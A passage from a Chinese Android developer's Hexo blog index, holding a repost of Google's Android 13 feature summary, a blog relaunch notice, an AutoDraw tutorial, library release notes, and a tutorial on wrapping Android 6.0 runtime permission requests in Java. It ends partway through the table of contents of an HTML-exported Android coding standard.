媒体控件在手机和平板电脑上保持一致</center><blockquote><p>PlaybackState<br>    <a href="https://developer.android.google.cn/reference/android/media/session/PlaybackState">https://developer.android.google.cn/reference/android/media/session/PlaybackState</a></p></blockquote><p><strong>蓝牙低功耗 (LE) 音频</strong> - 低功耗 (Low Energy, LE) 音频是用于实现新的用例的下一代无线音频。用户可以通过它与朋友和家人分享和广播自己的音频，或订阅公共广播以获得信息、娱乐或无障碍辅助信息。它旨在确保用户能够在不牺牲电池寿命的情况下接收高保真音频，并在不同用例之间无缝切换。Android 13 增加了对低功耗音频的内置支持，开发者们可在兼容的设备上使用这项新功能。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/reference/android/bluetooth/BluetoothLeAudio">https://developer.android.google.cn/reference/android/bluetooth/BluetoothLeAudio</a></p><blockquote><p>低功耗 (LE) 音频<br>    <a href="https://www.bluetooth.com/learn-about-bluetooth/recent-enhancements/le-audio/resources/">https://www.bluetooth.com/learn-about-bluetooth/recent-enhancements/le-audio/resources/</a></p></blockquote><p><strong>MIDI 2.0</strong> - Android 13 增加了对新的 MIDI 2.0 标准的支持，包括通过 USB 连接 MIDI 2.0 硬件的能力。这个更新的标准提供了一些新功能，如更高的控制器分辨率，更好地支持非西方音调，以及通过单一音符控制器提供更佳的表现力。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/reference/android/media/midi/MidiDeviceInfo#PROTOCOL_UMP_MIDI_2_0">https://developer.android.google.cn/reference/android/media/midi/MidiDeviceInfo#PROTOCOL_UMP_MIDI_2_0</a></p><blockquote><p>新的 MIDI 2.0 标准<br>    <a href="https://www.midi.org/midi-articles/details-about-midi-2-0-midi-ci-profiles-and-property-exchange">https://www.midi.org/midi-articles/details-about-midi-2-0-midi-ci-profiles-and-property-exchange</a></p></blockquote><p><strong>OpenJDK 11 更新</strong> - Android 13 核心库已经与 OpenJDK 11 LTS 版本保持一致，为应用和平台开发者提供库更新和 Java 11 编程语言支持。作为对 Android 12 及以上设备的 ART 模块更新的一部分，我们计划通过 Google Play 系统更新将这些核心库的变更发布至更多设备。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/features#core-libraries">https://developer.android.google.cn/about/versions/13/features#core-libraries</a></p><p><strong>预测性返回手势</strong> - Android 13 引入了新的 API，可让您的应用告诉系统它将提前处理返回事件，我们称之为 “提前” 模型。这个新方案会需要若干年来完善，以帮助您的应用程序支持预测性返回手势，该功能现在可通过开发者选项在当前版本中进行测试。请访问官方文档了解详细信息:</p><p><a href="https://developer.android.google.cn/guide/navigation/predictive-back-gesture">https://developer.android.google.cn/guide/navigation/predictive-back-gesture</a></p><blockquote><p>让系统返回操作回归本源<br>    <a href="https://io.google/2022/program/5c6a8dbb-7ac2-4c31-a707-0a16e8424970/">https://io.google/2022/program/5c6a8dbb-7ac2-4c31-a707-0a16e8424970/</a></p></blockquote><h3 id="为平板电脑而生"><a href="#为平板电脑而生" class="headerlink" title="为平板电脑而生"></a>为平板电脑而生</h3><p>Android 13 进一步拓展了我们今年早些时候发布的 Android 12L 功能更新，在平板电脑上提供了更好的体验。强化了一些功能，包括针对多任务操作改进过的任务栏，更多针对大屏幕的布局，以及针对系统界面和应用进行了许多优化，应用兼容模式也得到了改进，等等。</p><p><img src="/images/20220816/202208181423000.gif" alt="在运行 Android 13 的平板电脑上进行多任务操作"></p><center>在运行 Android 13 的平板电脑上进行多任务操作</center><blockquote><p>大屏幕使用入门<br>    <a href="https://developer.android.google.cn/guide/topics/large-screens/get-started-with-large-screens">https://developer.android.google.cn/guide/topics/large-screens/get-started-with-large-screens</a></p></blockquote><blockquote><p>适用于大屏幕设备开发的响应式布局<br>    <a href="https://developer.android.google.cn/large-screens">https://developer.android.google.cn/large-screens</a></p></blockquote><h3 id="隐私和安全"><a href="#隐私和安全" class="headerlink" title="隐私和安全"></a>隐私和安全</h3><p><strong>照片选择器和 API</strong> - 全新的系统照片选择器为用户分享本地和云端照片提供了标准且私密的方式。照片选择器针对 Android 上长期使用的文档选择器进行了扩展，使用户可以很容易地与应用分享特定的照片和视频，而无需授权应用查看设备上的所有媒体文件。照片选择器为照片和视频提供了专门的体验，并提供了供应用访问共享媒体文件的 API。Android 11 及以上系统设备 (Go 设备除外) 的用户会通过 Google Play 系统更新获得照片选择器功能。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/training/data-storage/shared/photopicker">https://developer.android.google.cn/training/data-storage/shared/photopicker</a></p><p><img src="/images/20220816/202208181424000.gif" alt="用户可以通过照片选择器向应用分享特定的照片和视频"></p><center>用户可以通过照片选择器向应用分享特定的照片和视频</center><p><strong>通知权限</strong> - 为了帮助用户专注于对他们最重要的通知，Android 13 引入了一个新的通知运行时权限。现在应用需要在发送通知之前向用户申请通知权限。对于以 Android 12 或更低版本为目标平台的应用，系统将代您处理升级流程。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/guide/topics/ui/notifiers/notification-permission">https://developer.android.google.cn/guide/topics/ui/notifiers/notification-permission</a></p><p><img src="/images/20220816/202208181425000.png" alt="Android 13 中的通知权限对话框"></p><center>Android 13 中的通知权限对话框</center><blockquote><p>POST_NOTIFICATIONS<br>    <a href="https://developer.android.google.cn/reference/android/Manifest.permission#POST_NOTIFICATIONS">https://developer.android.google.cn/reference/android/Manifest.permission#POST_NOTIFICATIONS</a></p></blockquote><p><strong>针对附近 Wi-Fi 设备的权限</strong> - Android 13 为管理设备与周围 Wi-Fi 热点连接的应用引入了新的 NEARBY_WIFI_DEVICES 运行时权限。许多常用的 Wi-Fi API 都需要这个新权限，从而让应用在不需要获得定位权限的情况下即可通过 Wi-Fi 发现并连接到附近的设备。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/guide/topics/connectivity/wifi-permissions">https://developer.android.google.cn/guide/topics/connectivity/wifi-permissions</a></p><blockquote><p>NEARBY_WIFI_DEVICES<br>    <a href="https://developer.android.google.cn/reference/android/Manifest.permission.html#NEARBY_WIFI_DEVICES">https://developer.android.google.cn/reference/android/Manifest.permission.html#NEARBY_WIFI_DEVICES</a></p></blockquote><p><strong>细化的媒体权限</strong> - 在分享照片和视频时，照片选择器现在是我们推荐的解决方案，它更加用户友好，且无需请求权限。但对于尚未使用照片选择器的应用，或者需要访问音频文件的场景，Android 13 也增加了新的更细化的媒体权限。这些媒体权限用以取代 READ_EXTERNAL_STORAGE 权限，让应用得以访问特定的媒体文件类型，包括图片、视频和音频。我们强烈建议您在条件允许时使用照片选择器方案，当应用以 Android 13 为目标平台且不适合使用该方案时，则推荐使用细化的媒体权限。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/behavior-changes-13#granular-media-permissions">https://developer.android.google.cn/about/versions/13/behavior-changes-13#granular-media-permissions</a><br>图片</p><p><img src="/images/20220816/202208181427000.png" alt="请求允许访问音频文件"></p><center>请求允许访问音频文件</center><blockquote><p>照片选择器<br>    <a href="https://developer.android.google.cn/training/data-storage/shared/photopicker">https://developer.android.google.cn/training/data-storage/shared/photopicker</a></p></blockquote><blockquote><p>READ_EXTERNAL_STORAGE<br>    <a href="https://developer.android.google.cn/reference/android/Manifest.permission.html#READ_EXTERNAL_STORAGE">https://developer.android.google.cn/reference/android/Manifest.permission.html#READ_EXTERNAL_STORAGE</a></p></blockquote><p><strong>开发者可降级权限</strong> - 从 Android 13 开始，如果应用不再需要某些之前由用户授予过的权限，可以通过新的 API 来降级权限。通过移除不再使用的权限，您的应用可以向用户表明其只使用了必需的最少权限，从而提高用户信任度。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/features#developer-downgradable-permissions">https://developer.android.google.cn/about/versions/13/features#developer-downgradable-permissions</a></p><blockquote><p>revokeOwnPermissionsOnKill<br>    <a href="https://developer.android.google.cn/reference/android/content/Context.html#revokeOwnPermissionsOnKill(java.util.Collection%3Cjava.lang.String%3E)">https://developer.android.google.cn/reference/android/content/Context.html#revokeOwnPermissionsOnKill(java.util.Collection%3Cjava.lang.String%3E)</a></p></blockquote><p><strong>更安全的导出 Intent 过滤器</strong> - 在向以 Android 13 为目标平台的其他应用的导出 intent 过滤器发送显式 intent 时，Android 13 给出了更严格的规则。如果 intent 指定了动作，则系统只在该 intent 与接收应用中声明的 <intent-filter> 元素匹配时才会向导出组件传递 intent。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/behavior-changes-13#intent-filters">https://developer.android.google.cn/about/versions/13/behavior-changes-13#intent-filters</a></p><h3 id="应用性能"><a href="#应用性能" class="headerlink" title="应用性能"></a>应用性能</h3><p>Android 13 通过对 ART 运行时的更新，提高了所有应用的性能和效率。我们正在为 Android 12 及以上设备更新 ART 模块，作为此项更新的一环，我们也会通过 Google Play 系统更新将这些性能改进带给更多的 Android 用户。</p><p><strong>垃圾回收改进</strong> - 一个基于 Linux 内核功能 userfaultfd 的新垃圾回收器会随着即将到来的 Google Play 系统更新加入 Android 13 设备的 ART。新的垃圾回收器消除了读取障碍，降低了每个对象加载的开销，减少了内存压力，使得编译后的代码体积能减少约 10%。它在 GC 时间也更高效，因为分页会随着压缩的进行而被释放。总而言之，新的垃圾回收器有助于节省电量，避免在 GC 过程中出现卡顿，以及让应用免于在低内存时被强行终止。</p><p><strong>遍及整个 ART 的优化</strong> - 在 Android 13 中，ART 让切换到本地代码的速度更快，反之亦然，现在 JNI 调用的速度可达之前的 2.5 倍。我们还重新设计了运行时的引用处理，使其基本处于非阻塞状态，这进一步减少了卡顿。我们公开了一个新的公共 API，Reference.refersTo()，让您可以尽快回收无法抵达的对象，我们还优化了类/方法的查找，从而让解释器的运行更快。最后，ART 现在在安装时会执行更多的字节码验证，避免了在运行时验证的损耗，从而让应用能快速启动。请观看应用性能更新介绍了解详细信息:<br><a href="https://io.google/2022/program/2cf473b7-113e-4332-a469-8dfd815eb45b/">https://io.google/2022/program/2cf473b7-113e-4332-a469-8dfd815eb45b/</a></p><blockquote><p>Reference.refersTo()<br>    <a href="https://developer.android.google.cn/reference/java/lang/ref/Reference.html#refersTo(T)">https://developer.android.google.cn/reference/java/lang/ref/Reference.html#refersTo(T)</a></p></blockquote><p>注:以上内容转载自<strong>谷歌开发者公众号</strong></p>]]></content>
      
      
      <categories>
          
          <category> 资讯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android13 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I come back</title>
      <link href="/2022/08/09/2022-08-09/"/>
      <url>/2022/08/09/2022-08-09/</url>
      
        <content type="html"><![CDATA[<h1 id="I-come-back"><a href="#I-come-back" class="headerlink" title="I come back"></a>I come back</h1><p>好久不见了大家，博客从17年开始停更，期间我主要是自主创业，时间不是很充裕，所以并未继续更新。现在在厦门一家终端方案提公司担任Android开发工程师，很遗憾的是创业失败了，目前正在开启还债之路，有空我将会写一篇这些的心酸历程分享给大家。</p><p><a href="https://github.com/">Github</a>众所周知的原因，访问速度不太稳定，检查以前的网站，有点问题，所以决定采用Hexo来重新搭建，<a href="https://hexo.io/">Hexo</a>是一个基于node.js的快速生成静态博客的开源框架，因为 Hexo 的创建者是台湾人，对中文的支持很友好,主题选用”Material Design”设计，比较符合我安卓开发的身份。<br>具体更新内容如下：</p><ol><li><strong>采用Hexo架构，页面采用“Material Design”风格</strong></li><li><strong>添加“时间轴”功能</strong></li><li><strong>添加搜索功能</strong></li><li><strong>浏览文章时添加返回顶部按钮</strong></li><li><strong>底部添加页面统计功能</strong></li></ol><p>在此特别感谢<a href="https://www.niemingzhao.top/">聂明照</a>大神提供的模板支持和热心解答（技术人都是热爱分享的）</p>]]></content>
      
      
      <categories>
          
          <category> 通知 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活感悟 </tag>
            
            <tag> Hexo </tag>
            
            <tag> Material Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能绘图工具AutoDraw使用教程</title>
      <link href="/2017/04/15/2017-04-15-20170415/"/>
      <url>/2017/04/15/2017-04-15-20170415/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>笔者最近换了工作，忙着投简历和搬房子，博客最近就没有更新。Google时不时会推出一些创新的东西，比如这个AutoDraw。</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>众所周知，Google的东西都需要翻墙，除了Google翻译。这里给大家推荐一款<a href="http://www.tianxing1.com/">天行VPN</a>，每天免费1个小时，对于大部分程序猿来说应该够了。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>AutoDraw是<a href="https://aiexperiments.withgoogle.com/">Google人工智能实验</a>的一个小项目，用机器学习技术将个人涂鸦转化为艺术品。</p><p><img src="/images/20170415/201704190701000.png"></p><p>软件使用极其简单，打开网址<a href="https://www.autodraw.com/">AutoDraw官网</a></p><p>1.在左边的画笔工具栏选择AutoDraw模式</p><p><img src="/images/20170415/201704190714000.png"></p><p>2.画一个你心目中的任意东西，比如说来一台电视</p><p><img src="/images/20170415/201704190717000.png"></p><p>3.自动关联出相应的东西，选择老式电视机</p><p><img src="/images/20170415/201704190716000.png"></p><p>4.帮你完成一台电视，就是如此简单</p><p><img src="/images/20170415/201704190718000.png"></p><p>5.提供下载图片功能</p><p><img src="/images/20170415/201704190715000.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AutoDraw </tag>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LibLongzhiye2.0重磅发布</title>
      <link href="/2017/03/08/2017-03-08-20170308/"/>
      <url>/2017/03/08/2017-03-08-20170308/</url>
      
        <content type="html"><![CDATA[<h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><ol><li>重构代码，更换为MVP架构</li><li>网络框架更换为OkHttp3+Gson+Glide</li><li>添加Android 6.0权限管理</li><li>全面支持RecyclerView</li></ol><h2 id="附链接"><a href="#附链接" class="headerlink" title="附链接"></a>附链接</h2><p><a href="https://github.com/longzhiye/LibLongzhiye">https://github.com/longzhiye/LibLongzhiye</a></p>]]></content>
      
      
      <categories>
          
          <category> 通知 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Lib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 6.0 权限封装</title>
      <link href="/2017/03/06/2017-03-06-20170306/"/>
      <url>/2017/03/06/2017-03-06-20170306/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>在此前的原生安卓系统中有应用通知管理功能，但更为深入的应用权限管理只能靠第三方应用实现。Android 6.0进一步强化应用权限管理，应用权限管理也成为系统级的功能，若没有加入适配的话应用很容易崩溃。先放出一篇官方的说明文档了解一下，很详细哦</p><p><a href="https://developer.android.google.cn/training/permissions/index.html">Google 官方权限说明</a></p><p>Google官方也在GitHub上开源了一款的第三方库EasyPermission，帮助你管理权限</p><p><a href="https://github.com/googlesamples/easypermissions">EasyPermission</a></p><p>英语不过关？请点下面</p><p><a href="https://github.com/tsy12321/easypermissions">EasyPermission(汉化版)</a></p><h2 id="2-问题"><a href="#2-问题" class="headerlink" title="2.问题"></a>2.问题</h2><p>Activity需要的不止一个权限，用户也可以在手机设置中修改相应的权限，如下图：</p><p><img src="/images/20170306/Screenshot_2017-03-06-09-46-20-194_com.miui.securitycenter.png"></p><p>所以需要在每次遇到Dangerous Permission 相关的业务处理时都要添加权限判断处理。虽然代码不多，但是需要同时在onRequestPermissionsResult、onPermissionsGranted、onPermissionsDenied等多处进行代码处理。就会显得很乱，降低代码的可读性。</p><p>最理想的方式当然时只要在需要的地方加一行代码即可以处理权限。封装权限处理应运而生。</p><h2 id="3-封装后的处理"><a href="#3-封装后的处理" class="headerlink" title="3.封装后的处理"></a>3.封装后的处理</h2><p>我们先直接看封装后的权限处理代码变成了什么样。下面是一个打开摄像头的业务，调用业务前需要处理摄像头权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cameraTask</span><span class="params">()</span> &#123;</span><br><span class="line">    String[] perms = &#123;Manifest.permission.CAMERA&#125;;</span><br><span class="line">    performCodeWithPermission(getString(R.string.rationale_camera), RC_CAMERA_PERM, perms, <span class="keyword">new</span> <span class="title class_">PermissionCallback</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hasPermission</span><span class="params">(List&lt;String&gt; allPerms)</span> &#123;</span><br><span class="line">            Toast.makeText(SimplePermActivity.<span class="built_in">this</span>, <span class="string">&quot;TODO: Camera things&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">noPermission</span><span class="params">(List&lt;String&gt; deniedPerms, List&lt;String&gt; grantedPerms, Boolean hasPermanentlyDenied)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasPermanentlyDenied) &#123;</span><br><span class="line">                alertAppSetPermission(getString(R.string.rationale_ask_again), RC_SETTINGS_SCREEN);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="type">int</span> resultCode, Intent data)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (requestCode == RC_SETTINGS_SCREEN) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, R.string.returned_from_app_settings_to_activity, Toast.LENGTH_SHORT)</span><br><span class="line">                .show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意下上面代码的alertAppSetPermission方法作用是，当权限被拒绝时，判断如果点了不再询问被拒绝的情况后弹出一个alert框，提示用户前往系统设置开启权限，这样更加人性化，不然如果用户拒绝过一次后之后的该权限将全部都会被拒绝。如下图</p><p><img src="/images/20170306/Screenshot_2017-03-06-10-08-23-973_com.ajmd.png"></p><p>再看下alertAppSetPermission方法有2个重载方法，有一个比另一个多了个requestCode参数。目的是当用户跳转系统设置返回后，有的需求可能希望返回后自动再判断用户有没有在系统设置中修改过权限从而直接继续下一步操作。这样实现onActivityResult方法，在系统页面返回时再次判断权限是否授予。</p><p>通过上面代码可以发现，封装过后只需要在需要权限处理的地方加一个performCodeWithPermission，然后再重载onActivityResult方法。如果没有页面返回后自动继续下一步的需求的话那就只需要调用performCodeWithPermission就可以了。做到了“伪一行代码”处理运行时权限。哈哈！</p><p>没有对比就没有伤害，我再把没有封装过的完整权限处理代码贴上来对比下。（使用了EasyPermission）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AfterPermissionGranted(RC_CAMERA_PERM)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cameraTask</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (EasyPermissions.hasPermissions(<span class="built_in">this</span>, Manifest.permission.CAMERA)) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;TODO: Camera things&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        EasyPermissions.requestPermissions(<span class="built_in">this</span>, getString(R.string.rationale_camera),</span><br><span class="line">                RC_CAMERA_PERM, Manifest.permission.CAMERA);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onRequestPermissionsResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="type">int</span>[] grantResults)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onRequestPermissionsResult(requestCode, permissions, grantResults);</span><br><span class="line"></span><br><span class="line">    EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPermissionsGranted</span><span class="params">(<span class="type">int</span> requestCode, List&lt;String&gt; perms)</span> &#123;</span><br><span class="line">    Log.d(TAG, <span class="string">&quot;onPermissionsGranted:&quot;</span> + requestCode + <span class="string">&quot;:&quot;</span> + perms.size());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPermissionsDenied</span><span class="params">(<span class="type">int</span> requestCode, List&lt;String&gt; perms)</span> &#123;</span><br><span class="line">    Log.d(TAG, <span class="string">&quot;onPermissionsDenied:&quot;</span> + requestCode + <span class="string">&quot;:&quot;</span> + perms.size());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (EasyPermissions.somePermissionPermanentlyDenied(<span class="built_in">this</span>, perms)) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AppSettingsDialog</span>.Builder(<span class="built_in">this</span>, getString(R.string.rationale_ask_again))</span><br><span class="line">                .setTitle(getString(R.string.title_settings_dialog))</span><br><span class="line">                .setPositiveButton(getString(R.string.setting))</span><br><span class="line">                .setNegativeButton(getString(R.string.cancel), <span class="literal">null</span>)</span><br><span class="line">                .setRequestCode(RC_SETTINGS_SCREEN)</span><br><span class="line">                .build()</span><br><span class="line">                .show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="type">int</span> resultCode, Intent data)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (requestCode == RC_SETTINGS_SCREEN) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, R.string.returned_from_app_settings_to_activity, Toast.LENGTH_SHORT)</span><br><span class="line">                .show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现比封装过的多了onRequestPermissionsResult、onPermissionsGranted、onPermissionsDenied三个回调的处理。就是说每次写权限处理需要写4<del>5个地方。而封装过的只需要写1</del>2个即可。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>在项目开发中，多处需要进行权限处理，必要的封装可以大大增加代码可读性，专注于业务代码的编写。</p><p>最后附上权限清单，android.Manifest.permission 上可以找到基础平台定义的权限列表。</p><p><a href="https://developer.android.google.cn/reference/android/Manifest.permission.html">权限清单</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LibLongzhiye正式开源了</title>
      <link href="/2017/02/10/2017-02-10-20170210/"/>
      <url>/2017/02/10/2017-02-10-20170210/</url>
      
        <content type="html"><![CDATA[<p>附上GitHub地址,欢迎大家关注，收藏。</p><p><a href="https://github.com/longzhiye/LibLongzhiye">https://github.com/longzhiye/LibLongzhiye</a></p>]]></content>
      
      
      <categories>
          
          <category> 通知 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android编码规范</title>
      <link href="/2017/01/31/2017-01-31-20170131/"/>
      <url>/2017/01/31/2017-01-31-20170131/</url>
      
        <content type="html"><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html><head><meta name="generator" content="LibreOffice 4.3.7.2 (Linux)"/><meta name="author" content="longzhiye"/><meta name="created" content="2017-01-31T09:07:00"/><meta name="changedby" content="Microsoft Office &#29992;&#25143;"/><meta name="changed" content="2017-01-31T09:07:00"/><meta name="AppVersion" content="15.0000"/><meta name="DocSecurity" content="0"/><meta name="HyperlinksChanged" content="false"/><meta name="KSOProductBuildVer" content="2052-9.1.0.4327"/><meta name="LinksUpToDate" content="false"/><meta name="ScaleCrop" content="false"/><meta name="ShareDoc" content="false"/><style type="text/css">@page { margin-left: 1.25in; margin-right: 1.25in; margin-top: 1in; margin-bottom: 1in }p { margin-bottom: 0.1in; direction: ltr; line-height: 120%; text-align: justify; widows: 0; orphans: 0 }p.western { font-size: 10pt }p.cjk { font-size: 10pt }h1 { margin-top: 0.19in; margin-bottom: 0.19in; direction: ltr; text-align: left; widows: 0; orphans: 0; page-break-after: auto }h1.western { font-family: "??", serif }h1.cjk { font-size: 24pt }h1.ctl { font-family: "??"; font-size: 24pt; font-weight: normal }h2 { margin-top: 0.19in; margin-bottom: 0.19in; direction: ltr; text-align: left; widows: 0; orphans: 0; page-break-after: auto }h2.western { font-family: "??", serif }h2.cjk { font-family: "??" }h2.ctl { font-family: "??"; font-weight: normal }h3 { margin-top: 0.19in; margin-bottom: 0.19in; direction: ltr; color: #000000; text-align: left; widows: 0; orphans: 0; page-break-after: auto }h3.western { font-family: "??", serif; font-size: 13pt }h3.cjk { font-family: "??"; font-size: 13pt }h3.ctl { font-family: "??"; font-size: 13pt; font-weight: normal }h4 { margin-top: 0.19in; margin-bottom: 0.19in; direction: ltr; color: #000000; text-align: left; widows: 0; orphans: 0; page-break-after: auto }h4.western { font-family: "??", serif }h4.cjk { font-family: "??" }h4.ctl { font-family: "??"; font-weight: normal }a:link { color: #0000ff; so-language: zxx }</style></head><body lang="en-US" link="#0000ff" dir="ltr"><div id="Table of Contents1" dir="ltr"><p style="margin-bottom: 0in; line-height: 100%"><a href="#_Toc997867887">1.<font face="&#23435;&#20307;"><span lang="zh-CN">&#21069;&#35328;</a></span></font><a href="#_Toc997867887"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc903899557">1.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26415;&#35821;&#35828;&#26126;</a></span></font><a href="#_Toc903899557"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1348454810">1.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25351;&#21335;&#35828;&#26126;&#26412;&#25991;&#26723;&#20013;&#30340;&#31034;&#20363;&#20195;&#30721;&#24182;&#19981;&#20316;&#20026;&#35268;&#33539;&#65292;&#20165;&#20379;&#21442;&#32771;&#12290;</a></span></font><a href="#_Toc1348454810"></a></p><p style="margin-bottom: 0in; line-height: 100%"><a href="#_Toc428393240">2.<font face="&#23435;&#20307;"><span lang="zh-CN">&#28304;&#25991;&#20214;&#22522;&#30784;</a></span></font><a href="#_Toc428393240"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc914905510">2.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25991;&#20214;&#21517;</a></span></font><a href="#_Toc914905510"></a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc157517057">2.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25991;&#20214;&#32534;&#30721;&#65306;</a></span></font><a href="#_Toc157517057">UTF-8</a></p><p style="margin-left: 0.29in; margin-bottom: 0in; line-height: 100%"><a href="#_Toc1603921428">2.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#29305;&#27530;&#23383;&#31526;</a></span></font><a href="#_Toc1603921428"></a></p><p 